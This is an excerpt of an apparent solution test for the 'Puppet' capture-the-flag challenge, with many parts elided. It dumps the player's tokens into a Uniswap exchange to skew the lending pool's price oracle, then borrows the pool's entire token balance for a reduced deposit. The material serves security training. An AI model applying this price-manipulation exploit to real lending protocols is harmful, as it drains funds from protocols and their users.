...
describe("[Challenge] Puppet", function () {
  ...
  it("Execution", async function () {
    ...
    // attacker = await (
    //   await ethers.getContractFactory("AttackPuppet", player)
    // ).deploy(token.address, lendingPool.address, uniswapExchange.address);
    ...
    console.log(
      await lendingPool.calculateDepositRequired(
    ...
    expect(await token.balanceOf(player.address)).to.be.eq(0);
    expect(await token.balanceOf(uniswapExchange.address)).to.be.eq(
      PLAYER_INITIAL_TOKEN_BALANCE + UNISWAP_INITIAL_TOKEN_RESERVE
    );

    // expect(await ethers.provider.getBalance(player.address)).to.be.eq(
    //   PLAYER_INITIAL_ETH_BALANCE + UNISWAP_INITIAL_ETH_RESERVE
    // );

    // expect(await ethers.provider.getBalance(uniswapExchange.address)).to.be.eq(
    //   0
    // );
    ...
    await lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE, player.address, {
      value: await lendingPool.calculateDepositRequired(
        await token.balanceOf(lendingPool.address)
      ),
    });
  });
